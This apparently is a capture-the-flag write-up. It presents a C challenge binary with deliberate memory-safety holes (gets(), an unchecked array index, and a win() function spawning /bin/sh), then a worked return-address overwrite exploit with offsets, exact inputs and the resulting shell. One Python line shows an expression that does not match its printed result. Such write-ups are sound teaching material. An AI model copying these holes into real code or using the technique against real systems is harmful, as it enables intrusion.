```c
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>

void menu() {
    puts("1. mine");
    puts("2. extract");
    puts("3. collapse");
    puts("4. abandon your friends");
    printf("> ");
}

int number() {
    int n;
    scanf("%d", &n); getchar();
    return n;
}

int main() {
    uint32_t minecarts[8];
    int choice;
    int index;
    uint32_t coal;
    uint32_t *addr;
    int depth;

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    while (true) {
        menu();
        choice = number();
        switch (choice) {
            case 1:
                printf("mining position\n> ");
                addr = (uint32_t *)number();
                printf("mining depth\n> ");
                depth = number();
                coal = (uint32_t)addr;
                for (int i = 0; i < depth; i++) {
                    coal = *(uint32_t *)coal;
                }
                break;
            case 2:
                printf("minecart number\n> ");
                index = number();
                if (index >= 0) {
                    minecarts[index] = coal;
                } else {
                    printf("minecart does not exist!\n");
                }
                break;
            case 3:
                printf("collapsing mineshaft\n> ");
                gets((char *)minecarts);
                break;
            case 4:
                printf("goodbye!");
                goto done;
            default:
                printf("invalid choice...");
                break;
        }
    }

done:
    return 0;
}

void win() {
    system("/bin/sh");
}
```

# Vulnerability Analysis

## **buffer overflow & out of bounds write**

- The bof (gets) in question is obvious and not used in the solution to win the challenge so we wont talk about it.

```c
            case 1:
                printf("mining position\n> ");
                addr = (uint32_t *)number();
                printf("mining depth\n> ");
                depth = number();
                coal = (uint32_t)addr;
                for (int i = 0; i < depth; i++) {
                    coal = *(uint32_t *)coal;
                }
                break;
            case 2:
                printf("minecart number\n> ");
                index = number();
                if (index >= 0) {
                    minecarts[index] = coal;
                } else {
                    printf("minecart does not exist!\n");
                }
                break;
```
- case 1:
    - our first input is an integer that is then turned into a pointer, we can feed this input the win function as an integer.
    - our second input is the upper limit for the loop, if depth is 0, the loop won't execute, and no dereferencing will be attempted.

- case 2:
    - we have an out of bounds write here, we calculated the offset between minecarts (where our input is stored) and the return address of the main function.

```c
            case 4:
                printf("goodbye!");
                goto done;
            default:
                printf("invalid choice...");
                break;
        }
    }

done:
    return 0;
}
```
- When case 4 is called, it jumps to done, done will jump to the return address which in this case is win since we will overwrite it.

```python
>>> 0x4080000c - 0x407fffdc
48
>>> (0x4080000c - 0x407fffdc)
12.0
```
- calculating the offset between the return address and minecarts
- (ret addr - minecarts) / 4 
    - divide by 4 since its 32bit

---

# Getting the Flag
- since the stack is slightly unalligned we need to send our address - 1
```python
>>> int(0x1082e-1)
67629
```

```
1. mine
2. extract
3. collapse
4. abandon your friends
> 1
mining position
> 67629
mining depth
> 0
1. mine
2. extract
3. collapse
4. abandon your friends
> 2
minecart number
> 12
1. mine
2. extract
3. collapse
4. abandon your friends
> 4
goodbye!$ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)
$ 

```
